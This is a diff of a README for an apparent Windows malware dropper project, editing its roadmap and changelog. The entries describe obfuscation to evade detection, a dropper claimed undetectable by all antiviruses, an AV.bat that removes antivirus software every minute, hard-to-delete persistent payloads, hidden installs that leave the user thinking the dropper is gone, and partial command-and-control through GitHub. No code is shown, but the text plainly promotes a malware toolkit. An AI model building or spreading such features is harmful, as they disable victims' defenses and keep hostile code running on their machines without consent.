@@ -6,7 +6,7 @@ Direct installation of the entire code as a .zip file may fail as "virus detecte
 
 Obfuscator used made by @moom825
 Code: https://github.com/moom825/batch-obfuscator-made-in-python
-Some files cannot be obfuscated, as a result, none are. This obfuscator, however, does work!
+Some files will fail to be obfuscated (functions of the file are lost); therefor, more files aren't obfuscated.
 
 Running this as default won't do much; you need to create your own .exe files!
 EXE files inside "install" were NOT MADE BY ME! These are only test files.
@@ -24,7 +24,7 @@ However, most popular anti-viruses will be automatically deleted and banned from
 (prob wont actually add these but who knows):
 
 
-PersistentPAYLOAD - MAke the payload hard to delete (multiple copies, re-install, etc)
+PersistentPAYLOAD - Make the payload hard to delete (multiple copies, re-install, etc)
 
 Make the code easier to use
 
@@ -32,15 +32,9 @@ Add DROPPER (not payload, as that's yours) support for older versions of Windows
 
 Faster Installs (Make the installs faster, by downloading incredibly low-size files to more hidden locations to be launched. User just thinks main dropper is deleted)
 
-Better PersistentINSTALL
-
 Multiple file support (Technically possible and easy, but too lazy to do it)
 
 More AVs in AV.bat
-
-Partial C&C in Github (for file uploading and updating, Update.bat doesn't really work)
-
-Remove bluescreen (might not even be possible)
 
 Compiling to EXE with _IExpress_ without causing detection
 
@@ -56,3 +50,5 @@ Compiling to EXE with _IExpress_ without causing detection
 - Made undetectable by all antiviruses (the dropper, not the payload)
 - Added AV.bat to permanently remove all extra antiviruses by running every minute.
 - Updated Release v1.7 to add PersistentINSTALL
+- Removed Bluescreen (Only if file is zipped when downloaded. Example is **picture.zip** file)
+- Partial C&C in Github (for file uploading and updating, Update.bat doesn't really work) [**finally fixed update.bat yess**]
